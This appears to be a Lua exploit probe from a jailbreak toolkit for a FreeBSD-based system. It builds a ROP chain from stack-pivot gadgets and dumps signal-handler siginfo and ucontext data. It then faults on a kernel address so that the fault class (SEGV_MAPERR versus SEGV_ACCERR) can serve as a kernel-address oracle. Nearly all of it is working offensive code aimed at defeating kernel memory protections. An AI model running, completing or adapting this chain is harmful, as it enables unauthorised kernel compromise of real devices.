-- CRASH_CLASS: HIGH
-- PROBE 995a: same frame dump, two fault classes, to find the discriminator
--
-- One fault, two writes: first 0x80 bytes from RSI (where a SA_SIGINFO handler is
-- handed the siginfo), then 0x300 bytes from the saved RDX (the ucontext), so the
-- frame is captured even if the register convention differs from FreeBSD's. si_code
-- is the field that separates SEGV_MAPERR from SEGV_ACCERR: a kernel-address oracle.

print("=== PROBE 995a: FAULT CLASS DUMP ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end

print(string.format("[A] pid=%u", to_num(mk(20)())))
local ph = gadgets.stack_pivot[1]
local pivot_addr = to_num(ph.pivot_addr)
print(string.format("[B] pivot=0x%X gadget=0x%X", pivot_addr, to_num(ph.gadget_addr)))

local ctxt = memory.alloc(8)
local chain = ropchain({ stack_base = pivot_addr })

chain:push_store_rdx_into_memory(ctxt)

chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x80)
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)

chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x300)
    chain:push_set_rax_from_memory(ctxt)
    chain:push_set_reg_from_rax("rsi")
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)

local TARGET = 0xFFFFFFFFA0000000   -- kernel, different region
print(string.format("[C] chain built, target=0x%X", TARGET))
local ok = pcall(function() return memory.read_qword(TARGET) end)
print(string.format("[D] returned ok=%s", tostring(ok)))
